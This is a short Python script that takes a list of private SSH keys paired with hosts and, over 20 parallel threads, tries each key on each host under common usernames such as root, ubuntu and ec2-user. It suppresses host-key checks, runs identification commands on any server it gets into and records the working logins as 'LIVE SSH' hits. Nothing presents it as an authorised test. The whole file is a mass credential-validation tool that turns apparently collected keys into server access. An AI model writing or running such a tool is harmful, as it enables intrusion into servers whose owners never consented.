import json, subprocess, os, sys, concurrent.futures as cf
pairs=json.load(open('pairs.json'))
USERS=["root","ubuntu","admin","deploy","centos","ec2-user"]
def try_pair(p):
    key=p["key"]; host=p["host"]
    os.chmod(key,0o600)
    for u in USERS:
        try:
            r=subprocess.run(["ssh","-i",key,"-o","BatchMode=yes","-o","StrictHostKeyChecking=no",
                              "-o","ConnectTimeout=6","-o","UserKnownHostsFile=/dev/null",
                              f"{u}@{host}","id; hostname; uname -a"],
                             capture_output=True,timeout=15,text=True)
            if r.returncode==0 and ("uid=" in r.stdout or "Linux" in r.stdout):
                return {"host":host,"user":u,"key":key,"out":r.stdout[:400]}
        except Exception:
            pass
    return None
hits=[]
with cf.ThreadPoolExecutor(max_workers=20) as ex:
    for f in cf.as_completed([ex.submit(try_pair,p) for p in pairs]):
        r=f.result()
        if r:
            hits.append(r); print("✅",json.dumps(r)[:300],flush=True)
print("LIVE SSH:",len(hits))
json.dump(hits,open("ssh_hits.json","w"),indent=1)
